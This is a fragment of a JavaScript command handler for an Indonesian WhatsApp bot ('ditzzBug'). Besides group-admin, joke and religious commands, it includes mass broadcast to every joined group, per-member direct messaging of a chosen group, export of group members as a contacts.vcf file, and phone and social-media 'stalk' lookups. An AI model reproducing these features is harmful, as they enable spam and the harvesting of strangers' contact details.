if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
...
case 'lesbicek':
case 'ceklesbi': {
if (!q) return ditzzreply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
...
//=================================================//
case 'kapankah': {
if (!q) return ditzzreply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${prefix + command} Saya Jadi Istrinya Ryo Kun >////<`)
...
ditzzreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break
//=================================================//
case 'bisakah': {
if (!text) return ditzzreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti ryo`)
...
//=================================================//
case 'apakah': {
if (!text) return ditzzreply( `Example : ${prefix + command} ryo cakep`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
ditzzreply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
...
fs.unlinkSync(media)
if (err) return ditzzreply(err)
let buff = fs.readFileSync(ran)
ditzzBug.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ditzzreply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
ditzzreply(e)
}
break
...
case 'tourl': {
ditzzreply(mess.wait)
let media = await ditzzBug.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
ditzzreply(util.format(anu))
...
if (!isPremium) return ditzzreply(mess.premium)
if (!isGroup) return ditzzreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return ditzzreply('Khusus Admin')
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
await ditzzBug.groupRevokeInvite(m.chat).then((res) => ditzzreply(`Sukses riset link group`)).catch((err) => ditzzreply(jsonformat(err)))
}
break
//=================================================//
case 'infogc': {
if(!isGroup) return ditzzreply("Hanya bisa di dalam group")
let _meta = await ditzzBug.groupMetadata(m.chat)
console.log(_meta)
let _img = await ditzzBug.profilePictureUrl(_meta.id, 'image') 
...
ditzzreply(mess.wait)
try {
var ppimg = await ditzzBug.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await ditzzBug.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'closegroup': {
if (!isGroup) return ditzzreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return ditzzreply('Khusus Admin')
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
if (!args[0]) return ditzzreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
...
setTimeout(() => {
var nomor = m.participant
ditzzBug.groupSettingUpdate(m.chat, 'not_announcement')
ditzzreply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
//=================================================//
...
//=================================================//
case 'hidetag':
if (!isGroup) return ditzzreply(mess.only.group)
if (!isAdmins && !isDeveloper) return ditzzreply('Khusus Admin')
if (!q) return ditzzreply(`Teks Nya Mana Kak?`)
ditzzBug.sendMessage(m.chat, {
    text: q,
    contextInfo: {
...
//=================================================//
case "tagall": {
if (!isDeveloper && !isAdmins) return ditzzreply(mess.admin)
if (!isGroup) return ditzzreply(mess.only.group)
if (!q) return ditzzreply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
...
ditzzBug.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'linkgroup': case 'linkgc':{
if (!isDeveloper && !isAdmins) return ditzzreply(mess.admin)
if (!m.isGroup) return ditzzreply(mess.only.group)
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
let response = await ditzzBug.groupInviteCode(m.chat)
ditzzBug.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
...
if (!isGroup) return ditzzreply(`Khusus Group Bego`)
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
if (!text) return ditzzreply(`teks untuk subject nya mana bego`)
await ditzzBug.groupUpdateDescription(m.chat, text)
ditzzreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editsubjek': {
...
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
if (!text) return ditzzreply(`teks untuk subject nya mana bego`)
await ditzzBug.groupUpdateSubject(m.chat, text)
ditzzreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
...
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await ditzzBug.groupSettingUpdate(m.chat, 'unlocked').then((res) => ditzzreply(`Sukses Membuka Edit Info Group`)).catch((err) => ditzzreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await ditzzBug.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => ditzzreply(jsonformat(err)))
 } else {
 ditzzreply(` Silahkan Ketik\nEditinfo Open\nEditinfo Close`)
}
}
break
//=================================================//
...
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await ditzzBug.groupSettingUpdate(m.chat, 'announcement').then((res) => ditzzreply(`Sukses Menutup Group`)).catch((err) => ditzzreply(jsonformat(err)))
} else if (args[0] === 'open'){
await ditzzBug.groupSettingUpdate(m.chat, 'not_announcement').then((res) => ditzzreply(`Sukses Membuka Group`)).catch((err) => ditzzreply(jsonformat(err)))
} else {
 ditzzreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
...
case "kick": {
if (!isGroup) return ditzzreply('Only Group')
if (!isAdmins && !isDeveloper) return ditzzreply('Only Admin')
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ditzzBug.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => ditzzreply(util.format(res))).catch((err) => ditzzreply(util.format(err)))
}
break
//=================================================//
case "add": {
...
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ditzzBug.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => ditzzreply(util.format(res))).catch((err) => ditzzreply(util.format(err)))
}
break
//=================================================//
case "demote": {
...
if (!isGroup) return ditzzreply('Only Group')
if (!isAdmins && !isDeveloper) return ditzzreply('Only Admin')
if (!isBotAdmins) return ditzzreply(`Bot Bukan Admi:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ditzzBug.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => ditzzreply(util.format(res))).catch((err) => ditzzreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
if (!isDeveloper) return ditzzreply(mess.usingsetpp)
if (!isGroup) return ditzzreply('Only Group')
if (!isAdmins && !isDeveloper) return ditzzreply('Only Admin')
if (!isBotAdmins) return ditzzreply('Maaf Kak Kaya Nya Kakak Tidak Bisa Menggunakan Fitur Ini Di Karenakan Bot Bukan Admin Group')
if (!quoted) return ditzzreply(`*Where is the picture?*`)
if (!/image/.test(mime)) return ditzzreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return ditzzreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await ditzzBug.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await ditzzBug.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
...
fs.unlinkSync(mediz)
ditzzreply(`*Success Beb✅*`)
} else {
var memeg = await ditzzBug.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
ditzzreply(`*Success Beb✅*`)
}
}
...
ditzzBug.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
//Islamic
case 'kisahnabi': {
if (!text) return ditzzreply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return ditzzreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
...
if (isNaN(args[0])) return ditzzreply (`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return ditzzreply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
...
ditzzreply(`${contoh} + ${data} + ${anjuran}`)
}
break
//=================================================//
case 'ayatkursi': {
...
//=================================================//
case 'niatsholat': {
if (!q) return ditzzreply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
...
if (!data) return ditzzreply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
ditzzreply(`
...
await ditzzBug.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break

//Cekrik
case "sshp": {
if (!text) return ditzzreply(`*Example: ${prefix+command} ${global.yt}*`)
let phone = await ssweb(text, "phone")
ditzzBug.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
//=================================================//
case "sspc": {
...
ditzzBug.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
//=================================================//
case "sstablet": {
...
ditzzBug.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break
...
await ditzzreply(mess.wait)
let getGroups = await ditzzBug.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ditzzBug.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ditzzBug.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await ditzzBug.sendMessage(xnxx, { image: { url: memek }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await ditzzBug.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
ditzzreply(mess.succes);
}
...
//=================================================//
case "cekidgc": {
if (!isPremium) return ditzzreply('*khusus Premium*') 
ditzzreply('Bentar Ya')
let getGroups = await ditzzBug.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `𖥂 *List Grub Lu*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ditzzBug.groupMetadata(x)
...
const metadata2 = await ditzzBug.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
ditzzBug.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(1500)
}
ditzzreply(mess.succes)
...
for (let pler of mem) {
ditzzBug.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1500)
}
ditzzreply(mess.succes)
}
...
media = await ditzzBug.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await ditzzBug.sendMessage(men, { image: { url: memek }, caption: captny }, { quoted: m })
await sleep(1500)
await ditzzBug.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await ditzzBug.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
...
await ditzzreply(mess.wait)
const groupMetadataa = !m.isGroup? await ditzzBug.groupMetadata(`${text}`).catch(e => {}) : ""
...
ditzzreply(util.format(err))
} finally {
await ditzzBug.sendMessage(m.sender, { document: fs.readFileSync("./dtbs/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU
...
await ditzzreply(mess.succes)
}
break
//=================================================//
case "lookup": {
//inireact();
if (!q) return ditzzreply(`Example: ${m.prefix + m.command} 62XXXX`);
try {
...
ditzzreply(JSON.stringify(result, null, 2));
} catch (error) {
ditzzreply(`Error: ${error.message}`);
}
}
break
...
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return ditzzreply(`Username? `)
...
└────────────`
await ditzzBug.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//=================================================//
case 'igstalk': {
if (!args[0]) return ditzzreply(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_xeon13`)
try {
...
└────────────`
 await ditzzBug.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
} catch {
ditzzreply(`Make sure the username comes from *Instagram*`)
}
}
break
//=================================================//
case 'ffstalk':{
if (!q) return ditzzreply(`Example ${prefix+command} 946716486`)
ditzzreply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
ditzzreply(`*/ Free Fire Stalker \\*
...
//=================================================//
case 'mlstalk': {
if (!q) return ditzzreply(`Example ${prefix+command} 530793138|8129`)
ditzzreply(mess.wait)
